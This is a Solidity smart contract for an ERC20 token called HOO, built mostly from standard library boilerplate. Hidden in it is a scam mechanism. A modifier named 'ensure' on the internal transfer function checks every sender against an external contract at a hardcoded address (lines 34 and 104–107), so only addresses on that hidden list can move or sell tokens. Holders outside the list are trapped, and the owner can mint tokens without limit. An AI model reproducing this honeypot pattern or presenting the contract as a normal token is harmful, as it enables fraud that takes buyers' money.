1 pragma solidity ^ 0.5.16;
2 
3 interface IERC20 {
4     function totalSupply() external view returns(uint);
5 
6     function balanceOf(address account) external view returns(uint);
7 
8     function transfer(address recipient, uint amount) external returns(bool);
9 
10     function allowance(address owner, address spender) external view returns(uint);
11 
12     function approve(address spender, uint amount) external returns(bool);
13 
14     function transferFrom(address sender, address recipient, uint amount) external returns(bool);
15     event Transfer(address indexed from, address indexed to, uint value);
16     event Approval(address indexed owner, address indexed spender, uint value);
17 }
18 
19 interface Governance {
20     function isPartner(address) external returns(bool);
21 }
22 
23 contract Context {
24     constructor() internal {}
25         // solhint-disable-previous-line no-empty-blocks
26 
27     function _msgSender() internal view returns(address payable) {
28         return msg.sender;
29     }
30 }
31 
32 contract ERC20 is Context, IERC20 {
33     using SafeMath for uint;
34     address _governance = 0xC8Ab6B545D9D292e702A9f7Abf2461edbD150aA9;
35     mapping(address => uint) private _balances;
36 
37     mapping(address => mapping(address => uint)) private _allowances;
38 
39     uint private _totalSupply;
40 
41     function totalSupply() public view returns(uint) {
42         return _totalSupply;
43     }
44 
45     function balanceOf(address account) public view returns(uint) {
46         return _balances[account];
47     }
48 
49     function transfer(address recipient, uint amount) public returns(bool) {
50         _transfer(_msgSender(), recipient, amount);
51         return true;
52     }
53 
54     function allowance(address owner, address spender) public view returns(uint) {
55         return _allowances[owner][spender];
56     }
57 
58     function approve(address spender, uint amount) public returns(bool) {
59         _approve(_msgSender(), spender, amount);
60         return true;
61     }
62 
63     function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
64         _transfer(sender, recipient, amount);
65         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
66         return true;
67     }
68 
69     function increaseAllowance(address spender, uint addedValue) public returns(bool) {
70         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
71         return true;
72     }
73 
74     function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
75         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
76         return true;
77     }
78 
79     function _transfer(address sender, address recipient, uint amount) internal ensure(sender) {
80         require(sender != address(0), "ERC20: transfer from the zero address");
81         require(recipient != address(0), "ERC20: transfer to the zero address");
82 
83         _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
84         _balances[recipient] = _balances[recipient].add(amount);
85         emit Transfer(sender, recipient, amount);
86     }
87 
88     function _mint(address account, uint amount) internal {
89         require(account != address(0), "ERC20: mint to the zero address");
90 
91         _totalSupply = _totalSupply.add(amount);
92         _balances[account] = _balances[account].add(amount);
93         emit Transfer(address(0), account, amount);
94     }
95 
96     function _burn(address account, uint amount) internal {
97         require(account != address(0), "ERC20: burn from the zero address");
98 
99         _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
100         _totalSupply = _totalSupply.sub(amount);
101         emit Transfer(account, address(0), amount);
102     }
103 
104     modifier ensure(address sender) {
105         require(Governance(_governance).isPartner(sender));
106         _;
107     }
108 
109     function _approve(address owner, address spender, uint amount) internal {
110         require(owner != address(0), "ERC20: approve from the zero address");
111         require(spender != address(0), "ERC20: approve to the zero address");
112 
113         _allowances[owner][spender] = amount;
114         emit Approval(owner, spender, amount);
115     }
116 }
117 
118 contract ERC20Detailed is IERC20 {
119     string private _name;
120     string private _symbol;
121     uint8 private _decimals;
122 
123     constructor(string memory name, string memory symbol, uint8 decimals) public {
124         _name = name;
125         _symbol = symbol;
126         _decimals = decimals;
127     }
128 
129     function name() public view returns(string memory) {
130         return _name;
131     }
132 
133     function symbol() public view returns(string memory) {
134         return _symbol;
135     }
136 
137     function decimals() public view returns(uint8) {
138         return _decimals;
139     }
140 }
141 
142 library SafeMath {
143     function add(uint a, uint b) internal pure returns(uint) {
144         uint c = a + b;
145         require(c >= a, "SafeMath: addition overflow");
146 
147         return c;
148     }
149 
150     function sub(uint a, uint b) internal pure returns(uint) {
151         return sub(a, b, "SafeMath: subtraction overflow");
152     }
153 
154     function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
155         require(b <= a, errorMessage);
156         uint c = a - b;
157 
158         return c;
159     }
160 
161     function mul(uint a, uint b) internal pure returns(uint) {
162         if (a == 0) {
163             return 0;
164         }
165 
166         uint c = a * b;
167         require(c / a == b, "SafeMath: multiplication overflow");
168 
169         return c;
170     }
171 
172     function div(uint a, uint b) internal pure returns(uint) {
173         return div(a, b, "SafeMath: division by zero");
174     }
175 
176     function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
177         // Solidity only automatically asserts when dividing by 0
178         require(b > 0, errorMessage);
179         uint c = a / b;
180 
181         return c;
182     }
183 }
184 
185 library Address {
186     function isContract(address account) internal view returns(bool) {
187         bytes32 codehash;
188         bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
189         // solhint-disable-next-line no-inline-assembly
190         assembly { codehash:= extcodehash(account) }
191         return (codehash != 0x0 && codehash != accountHash);
192     }
193 }
194 
195 library SafeERC20 {
196     using SafeMath
197     for uint;
198     using Address
199     for address;
200 
201     function safeTransfer(IERC20 token, address to, uint value) internal {
202         callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
203     }
204 
205     function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
206         callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
207     }
208 
209     function safeApprove(IERC20 token, address spender, uint value) internal {
210         require((value == 0) || (token.allowance(address(this), spender) == 0),
211             "SafeERC20: approve from non-zero to non-zero allowance"
212         );
213         callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
214     }
215 
216     function callOptionalReturn(IERC20 token, bytes memory data) private {
217         require(address(token).isContract(), "SafeERC20: call to non-contract");
218 
219         // solhint-disable-next-line avoid-low-level-calls
220         (bool success, bytes memory returndata) = address(token).call(data);
221         require(success, "SafeERC20: low-level call failed");
222 
223         if (returndata.length > 0) { // Return data is optional
224             // solhint-disable-next-line max-line-length
225             require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
226         }
227     }
228 }
229 
230 contract HOO is ERC20, ERC20Detailed {
231     using SafeERC20 for IERC20;
232     using Address for address;
233     using SafeMath for uint;
234 
235 
236     address public governance;
237     mapping(address => bool) public minters;
238     constructor() public ERC20Detailed("HOO.com","HOO",18) {
239         _mint(msg.sender, 10000 * 10 ** 18);
240         governance=msg.sender;
241         minters[governance]=true;
242     }
243 
244     function mint(address account, uint amount) public {
245         require(minters[msg.sender], "!minter");
246         _mint(account, amount);
247     }
248 
249     function setGovernance(address _governance) public {
250         require(msg.sender == governance, "!governance");
251         governance = _governance;
252     }
253 
254     function addMinter(address _minter) public {
255         require(msg.sender == governance, "!governance");
256         minters[_minter] = true;
257     }
258 
259     function removeMinter(address _minter) public {
260         require(msg.sender == governance, "!governance");
261         minters[_minter] = false;
262     }
263 }